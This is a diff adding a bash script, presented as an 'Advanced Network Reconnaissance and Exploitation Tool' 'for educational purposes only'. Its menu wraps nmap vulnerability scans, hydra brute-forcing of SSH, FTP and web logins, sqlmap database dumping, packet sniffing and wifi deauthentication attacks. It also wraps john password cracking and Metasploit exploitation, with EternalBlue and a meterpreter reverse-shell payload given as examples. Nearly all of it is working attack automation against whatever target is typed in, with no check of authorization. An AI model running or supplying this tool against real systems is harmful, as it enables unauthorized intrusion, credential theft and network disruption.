@@ -1,0 +1,328 @@
+#!/bin/bash
+
+# Advanced Network Reconnaissance and Exploitation Tool
+# For educational purposes only
+
+# Colors
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[0;33m'
+BLUE='\033[0;34m'
+MAGENTA='\033[0;35m'
+CYAN='\033[0;36m'
+NC='\033[0m' # No Color
+
+# Display banner
+function display_banner() {
+    clear
+    echo -e "${RED}"
+    echo "  _   _      _                      _      _____           _     "
+    echo " | \ | | ___| |___      _____  _ __| | __ |_   _|__   ___ | |___ "
+    echo " |  \| |/ _ \ __\ \ /\ / / _ \| '__| |/ /   | |/ _ \ / _ \| / __|"
+    echo " | |\  |  __/ |_ \ V  V / (_) | |  |   <    | | (_) | (_) | \__ \\"
+    echo " |_| \_|\___|\__| \_/\_/ \___/|_|  |_|\_\   |_|\___/ \___/|_|___/"
+    echo "                                                                  "
+    echo -e "${NC}"
+    echo -e "${YELLOW}[*] Advanced Network Reconnaissance and Exploitation Tool${NC}"
+    echo -e "${YELLOW}[*] Version: 3.1.4${NC}"
+    echo -e "${YELLOW}[*] For educational purposes only${NC}"
+    echo ""
+}
+
+# Check for root
+function check_root() {
+    if [[ $EUID -ne 0 ]]; then
+        echo -e "${RED}[!] This script must be run as root${NC}"
+        exit 1
+    fi
+}
+
+# Check dependencies
+function check_dependencies() {
+    echo -e "${BLUE}[*] Checking dependencies...${NC}"
+    
+    DEPS=("nmap" "hydra" "sqlmap" "dirb" "metasploit-framework" "aircrack-ng" "john" "wireshark" "tcpdump")
+    MISSING=()
+    
+    for dep in "${DEPS[@]}"; do
+        if ! command -v "$dep" &> /dev/null; then
+            MISSING+=("$dep")
+        fi
+    done
+    
+    if [ ${#MISSING[@]} -ne 0 ]; then
+        echo -e "${YELLOW}[!] Missing dependencies: ${MISSING[*]}${NC}"
+        read -p "Do you want to install them? (y/n): " choice
+        if [[ "$choice" =~ ^[Yy]$ ]]; then
+            apt-get update
+            apt-get install -y "${MISSING[@]}"
+        else
+            echo -e "${RED}[!] Cannot continue without required dependencies${NC}"
+            exit 1
+        fi
+    else
+        echo -e "${GREEN}[+] All dependencies are installed${NC}"
+    fi
+}
+
+# Function to perform port scanning
+function port_scan() {
+    local target=$1
+    local scan_type=$2
+    
+    echo -e "${BLUE}[*] Starting port scan on $target${NC}"
+    
+    case $scan_type in
+        "quick")
+            echo -e "${YELLOW}[*] Performing quick scan...${NC}"
+            nmap -T4 -F "$target"
+            ;;
+        "full")
+            echo -e "${YELLOW}[*] Performing full port scan...${NC}"
+            nmap -p- -T4 "$target"
+            ;;
+        "vuln")
+            echo -e "${YELLOW}[*] Performing vulnerability scan...${NC}"
+            nmap -sV --script vuln "$target"
+            ;;
+        *)
+            echo -e "${RED}[!] Invalid scan type${NC}"
+            return 1
+            ;;
+    esac
+    
+    echo -e "${GREEN}[+] Scan complete${NC}"
+}
+
+# Function to perform brute force attacks
+function brute_force() {
+    local target=$1
+    local service=$2
+    local username=$3
+    local wordlist=$4
+    
+    echo -e "${BLUE}[*] Starting brute force attack on $target${NC}"
+    
+    case $service in
+        "ssh")
+            echo -e "${YELLOW}[*] Brute forcing SSH...${NC}"
+            hydra -l "$username" -P "$wordlist" "$target" ssh
+            ;;
+        "ftp")
+            echo -e "${YELLOW}[*] Brute forcing FTP...${NC}"
+            hydra -l "$username" -P "$wordlist" "$target" ftp
+            ;;
+        "http-post")
+            echo -e "${YELLOW}[*] Brute forcing HTTP POST...${NC}"
+            hydra -l "$username" -P "$wordlist" "$target" http-post-form "/login:username=^USER^&password=^PASS^:F=Login failed"
+            ;;
+        *)
+            echo -e "${RED}[!] Invalid service type${NC}"
+            return 1
+            ;;
+    esac
+    
+    echo -e "${GREEN}[+] Brute force complete${NC}"
+}
+
+# Function to perform SQL injection
+function sql_injection() {
+    local target=$1
+    local url=$2
+    
+    echo -e "${BLUE}[*] Starting SQL injection on $url${NC}"
+    
+    echo -e "${YELLOW}[*] Testing for SQL injection vulnerabilities...${NC}"
+    sqlmap -u "$url" --batch --dbs
+    
+    echo -e "${GREEN}[+] SQL injection test complete${NC}"
+}
+
+# Function to perform web directory brute force
+function dir_brute() {
+    local target=$1
+    local wordlist=$2
+    
+    echo -e "${BLUE}[*] Starting directory brute force on $target${NC}"
+    
+    echo -e "${YELLOW}[*] Brute forcing directories...${NC}"
+    dirb "$target" "$wordlist"
+    
+    echo -e "${GREEN}[+] Directory brute force complete${NC}"
+}
+
+# Function to perform network sniffing
+function network_sniff() {
+    local interface=$1
+    local filter=$2
+    local output=$3
+    
+    echo -e "${BLUE}[*] Starting network sniffing on $interface${NC}"
+    
+    echo -e "${YELLOW}[*] Capturing traffic...${NC}"
+    if [[ -n "$output" ]]; then
+        tcpdump -i "$interface" "$filter" -w "$output"
+    else
+        tcpdump -i "$interface" "$filter"
+    fi
+    
+    echo -e "${GREEN}[+] Sniffing complete${NC}"
+}
+
+# Function to perform wireless attacks
+function wireless_attack() {
+    local interface=$1
+    local action=$2
+    
+    echo -e "${BLUE}[*] Starting wireless attack using $interface${NC}"
+    
+    case $action in
+        "scan")
+            echo -e "${YELLOW}[*] Scanning for wireless networks...${NC}"
+            airmon-ng start "$interface"
+            airodump-ng "${interface}mon"
+            ;;
+        "deauth")
+            local bssid=$3
+            local client=$4
+            local count=$5
+            
+            echo -e "${YELLOW}[*] Starting deauthentication attack...${NC}"
+            airmon-ng start "$interface"
+            aireplay-ng --deauth "$count" -a "$bssid" -c "$client" "${interface}mon"
+            ;;
+        *)
+            echo -e "${RED}[!] Invalid wireless action${NC}"
+            return 1
+            ;;
+    esac
+    
+    echo -e "${GREEN}[+] Wireless attack complete${NC}"
+}
+
+# Function to perform password cracking
+function password_crack() {
+    local hash_file=$1
+    local hash_type=$2
+    local wordlist=$3
+    
+    echo -e "${BLUE}[*] Starting password cracking${NC}"
+    
+    echo -e "${YELLOW}[*] Cracking passwords...${NC}"
+    john --format="$hash_type" --wordlist="$wordlist" "$hash_file"
+    
+    echo -e "${GREEN}[+] Password cracking complete${NC}"
+}
+
+# Function to perform exploitation with Metasploit
+function exploit() {
+    local target=$1
+    local exploit_name=$2
+    local payload=$3
+    
+    echo -e "${BLUE}[*] Starting exploitation on $target${NC}"
+    
+    echo -e "${YELLOW}[*] Setting up exploit...${NC}"
+    msfconsole -q -x "use $exploit_name; set RHOSTS $target; set PAYLOAD $payload; exploit; exit;"
+    
+    echo -e "${GREEN}[+] Exploitation complete${NC}"
+}
+
+# Main menu
+function main_menu() {
+    while true; do
+        display_banner
+        
+        echo -e "${CYAN}=== Main Menu ===${NC}"
+        echo "1. Port Scanning"
+        echo "2. Brute Force Attacks"
+        echo "3. SQL Injection"
+        echo "4. Directory Brute Force"
+        echo "5. Network Sniffing"
+        echo "6. Wireless Attacks"
+        echo "7. Password Cracking"
+        echo "8. Exploitation"
+        echo "9. Exit"
+        
+        read -p "Select an option: " option
+        
+        case $option in
+            1)
+                read -p "Enter target IP/domain: " target
+                read -p "Enter scan type (quick/full/vuln): " scan_type
+                port_scan "$target" "$scan_type"
+                read -p "Press enter to continue..."
+                ;;
+            2)
+                read -p "Enter target IP/domain: " target
+                read -p "Enter service (ssh/ftp/http-post): " service
+                read -p "Enter username: " username
+                read -p "Enter wordlist path: " wordlist
+                brute_force "$target" "$service" "$username" "$wordlist"
+                read -p "Press enter to continue..."
+                ;;
+            3)
+                read -p "Enter target URL (e.g., http://example.com/page.php?id=1): " url
+                sql_injection "$(echo "$url" | cut -d/ -f3)" "$url"
+                read -p "Press enter to continue..."
+                ;;
+            4)
+                read -p "Enter target URL (e.g., http://example.com/): " target
+                read -p "Enter wordlist path: " wordlist
+                dir_brute "$target" "$wordlist"
+                read -p "Press enter to continue..."
+                ;;
+            5)
+                read -p "Enter network interface: " interface
+                read -p "Enter filter (e.g., 'port 80', leave empty for all): " filter
+                read -p "Enter output file (leave empty for display only): " output
+                network_sniff "$interface" "$filter" "$output"
+                read -p "Press enter to continue..."
+                ;;
+            6)
+                read -p "Enter wireless interface: " interface
+                read -p "Enter action (scan/deauth): " action
+                
+                if [[ "$action" == "deauth" ]]; then
+                    read -p "Enter BSSID: " bssid
+                    read -p "Enter client MAC (or 'FF:FF:FF:FF:FF:FF' for all): " client
+                    read -p "Enter number of deauth packets: " count
+                    wireless_attack "$interface" "$action" "$bssid" "$client" "$count"
+                else
+                    wireless_attack "$interface" "$action"
+                fi
+                
+                read -p "Press enter to continue..."
+                ;;
+            7)
+                read -p "Enter hash file path: " hash_file
+                read -p "Enter hash type (e.g., md5/sha1/ntlm): " hash_type
+                read -p "Enter wordlist path: " wordlist
+                password_crack "$hash_file" "$hash_type" "$wordlist"
+                read -p "Press enter to continue..."
+                ;;
+            8)
+                read -p "Enter target IP: " target
+                read -p "Enter exploit name (e.g., exploit/windows/smb/ms17_010_eternalblue): " exploit_name
+                read -p "Enter payload (e.g., windows/x64/meterpreter/reverse_tcp): " payload
+                exploit "$target" "$exploit_name" "$payload"
+                read -p "Press enter to continue..."
+                ;;
+            9)
+                echo -e "${GREEN}[*] Exiting...${NC}"
+                exit 0
+                ;;
+            *)
+                echo -e "${RED}[!] Invalid option${NC}"
+                sleep 2
+                ;;
+        esac
+    done
+}
+
+# Program entry point
+display_banner
+sleep 2
+check_root
+check_dependencies
+main_menu
